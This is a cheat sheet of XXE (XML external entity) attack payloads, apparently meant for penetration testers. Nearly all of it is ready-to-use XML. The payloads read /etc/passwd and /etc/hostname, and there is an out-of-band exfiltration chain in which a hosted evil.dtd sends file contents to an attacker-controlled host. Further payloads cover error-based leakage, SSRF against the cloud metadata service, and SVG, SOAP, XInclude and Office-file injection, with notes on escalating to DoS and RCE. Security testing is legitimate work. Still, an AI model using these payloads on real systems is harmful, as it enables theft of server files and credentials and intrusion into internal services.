# XXE — Payload Cheatsheet

## Detection Payloads

### Basic XXE (file read)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### OOB XXE (blind — data via HTTP)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{collaborator}/xxe">
  %xxe;
]>
<root>test</root>
```

### OOB with Data Exfiltration
```xml
<!-- Hosted DTD on attacker server (evil.dtd): -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{collaborator}/?d=%file;'>">
%eval;
%exfil;

<!-- Payload: -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{attacker}/evil.dtd">
  %xxe;
]>
<root>test</root>
```

### Error-Based XXE (data in error message)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
```

### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

## Context-Specific Payloads

### SVG Upload
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### XLSX/DOCX (Office XML)
```
# 1. Unzip the .xlsx file
# 2. Edit xl/workbook.xml or [Content_Types].xml
# 3. Inject XXE entity definition
# 4. Rezip and upload
```

### SOAP Request
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <data>&xxe;</data>
  </soapenv:Body>
</soapenv:Envelope>
```

### XInclude (when you can't control DOCTYPE)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## Parser-Specific Notes

| Parser | Parameter Entities | External Entities | XInclude |
|--------|-------------------|-------------------|----------|
| libxml2 (PHP) | Yes | Yes | Yes |
| Java SAX/DOM | Yes | Yes | Yes |
| .NET XmlDocument | Yes (default) | Yes (default) | No |
| Python lxml | Depends on config | Depends on config | Yes |
| Go encoding/xml | No | No | No |

## Validation Criteria

1. File contents from server visible in response or OOB channel
2. Not just DTD parsing — actual data exfiltration demonstrated
3. Works with the application's actual XML parser configuration
4. Impact beyond just confirming the parser processes entities

## Impact Escalation

| Impact | What to demonstrate |
|--------|-------------------|
| File read | /etc/passwd, application config files |
| SSRF | Cloud metadata, internal services |
| Data exfil | Sensitive application data via OOB |
| DoS | Billion laughs (entity expansion) |
| RCE (rare) | PHP expect:// or jar:// protocol chains |
